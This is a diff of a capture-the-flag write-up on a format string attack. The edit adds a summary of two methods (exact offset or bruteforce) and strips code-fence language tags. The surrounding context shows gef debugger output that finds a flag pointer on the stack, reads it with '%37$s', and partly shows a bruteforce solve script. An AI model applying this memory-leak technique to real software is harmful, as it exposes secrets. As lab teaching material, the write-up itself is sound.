@@ -7,7 +7,12 @@ description: Leak all the stack using a format string attack.
 
 ## Summary
 
-Leak all the stack using a format string attack.
+Two ways :
+
+1. Find the exact offset of the data we want to leak.
+2. Bruteforce the stack until we get the right offset.
+
+Both methods work very well, only the first is more instructive.
 
 ## Challenge
 
@@ -70,7 +75,7 @@ The content of the file is located inside the heap, but there is a pointer to th
 
 We can find this address in the stack by setting a breakpoint on the call of the vulnerable `printf` function.
 
-```asm
+```
 gef➤  disass printMessage3
 Dump of assembler code for function printMessage3:
    0x000006ed <+0>:     push   ebp
@@ -99,7 +104,7 @@ gef➤  b *(printMessage3+42)
 
 Let's run the program and find where the flag is located using the command `grep`.
 
-```asm
+```
 gef➤  grep "FLAG{gg}"
 [+] Searching 'FLAG{gg}' in memory
 [+] In '[heap]'(0x56558000-0x5657a000), permission=rw-
@@ -109,7 +114,7 @@ gef➤  grep "FLAG{gg}"
 
 As you can see, the content of `flag.txt` is stored on the heap, but lets try to find `0x56558a40` or `0x56558c10` in the stack.
 
-```asm
+```
 gef➤  x/50xw $sp
 0xffffd1c0:     0x565585b0      0x0000000a      0x00000004      0x565556f9
 0xffffd1d0:     0x00000001      0x56556fb4      0xffffd1f8      0x56555755
@@ -131,7 +136,7 @@ gef➤  x/s 0x56558a40
 As you can see, there is our address inside `> <`.
 `0x56558a40` is a the 37th place in the stack, so we can retrieve it using `%37$s`.
 
-```bash
+```
 $ ./vuln
 input whatever string you want; then it will be printed back:
 
@@ -173,7 +178,7 @@ while b"FLAG{" not in data:
 
 Execution :
 
-```bash
+```
 $ echo 'FLAG{gg}' > flag.txt
 $ python3 solve.py
 [*] Trying n°0 ...
